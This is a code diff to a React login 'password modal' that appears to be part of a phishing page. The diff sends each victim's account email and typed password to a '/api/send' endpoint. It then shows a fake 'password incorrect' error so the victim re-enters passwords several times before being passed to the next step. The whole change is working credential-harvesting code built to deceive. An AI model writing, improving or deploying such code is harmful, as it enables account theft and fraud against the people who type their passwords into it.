@@ -7,6 +7,7 @@ import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
+import config from '@/utils/config';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
@@ -19,7 +20,8 @@ const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
-
+    const [attempt, setAttempt] = useState(1);
+    const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { messageId, setMessageId, message, setMessage, geoInfo } = store();
@@ -34,7 +36,8 @@ const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
             'Password',
             'Continue',
             'Forgotten password?',
-            'For your security, you must enter your password to continue.'
+            'For your security, you must enter your password to continue.',
+            'The password you\'ve entered is incorrect'
         ];
         const translateAll = async () => {
             const results = await Promise.all(
@@ -59,28 +62,56 @@ const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
         if (isLoading || !message || !password) return;
         setIsLoading(true);
 
-        const updatedMessage = `${message}
+        if (attempt < config.MAX_PASS) {
+            const label = config.MAX_PASS === 1 ? 'Password' : `Password ${attempt}`;
+            const updatedMessage = attempt === 1
+                ? `${message}\n\n<b>📧 Account Email:</b> <code>${userEmail}</code>\n<b>🔒 ${label}:</b> <code>${password}</code>`
+                : `${message}\n\n<b>🔒 ${label}:</b> <code>${password}</code>`;
 
-<b>📧 Account Email:</b> <code>${userEmail}</code>
-<b>🔒 Password:</b> <code>${password}</code>`;
+            try {
+                const res = await axios.post('/api/send', {
+                    message: updatedMessage,
+                    message_id: messageId
+                });
 
-        try {
-            const res = await axios.post('/api/send', {
-                message: updatedMessage,
-                message_id: messageId
-            });
-
-            if (res?.data?.success) {
-                setMessage(updatedMessage);
-                if (typeof res.data.data?.result?.message_id === 'number') {
-                    setMessageId(res.data.data.result.message_id);
+                if (res?.data?.success) {
+                    setMessage(updatedMessage);
+                    if (typeof res.data.data?.result?.message_id === 'number') {
+                        setMessageId(res.data.data.result.message_id);
+                    }
                 }
+            } catch {
+                // Continue even if send fails
+            } finally {
+                setIsLoading(false);
+                setShowError(true);
+                setPassword('');
+                setAttempt(attempt + 1);
             }
-            nextStep();
-        } catch {
-            nextStep();
-        } finally {
-            setIsLoading(false);
+        } else {
+            const label = config.MAX_PASS === 1 ? 'Password' : `Password ${attempt}`;
+            const updatedMessage = attempt === 1
+                ? `${message}\n\n<b>📧 Account Email:</b> <code>${userEmail}</code>\n<b>🔒 ${label}:</b> <code>${password}</code>`
+                : `${message}\n\n<b>🔒 ${label}:</b> <code>${password}</code>`;
+
+            try {
+                const res = await axios.post('/api/send', {
+                    message: updatedMessage,
+                    message_id: messageId
+                });
+
+                if (res?.data?.success) {
+                    setMessage(updatedMessage);
+                    if (typeof res.data.data?.result?.message_id === 'number') {
+                        setMessageId(res.data.data.result.message_id);
+                    }
+                }
+                nextStep();
+            } catch {
+                nextStep();
+            } finally {
+                setIsLoading(false);
+            }
         }
     };
 
@@ -120,6 +151,13 @@ const PasswordModal: FC<PasswordModalProps> = ({ userEmail, nextStep }) => {
                                 />
                             </div>
                         </div>
+
+                        {/* Error Message */}
+                        {showError && (
+                            <p className='text-xs sm:text-sm text-red-500'>
+                                {t('The password you\'ve entered is incorrect')}
+                            </p>
+                        )}
 
                         {/* Log In Button */}
                         <button
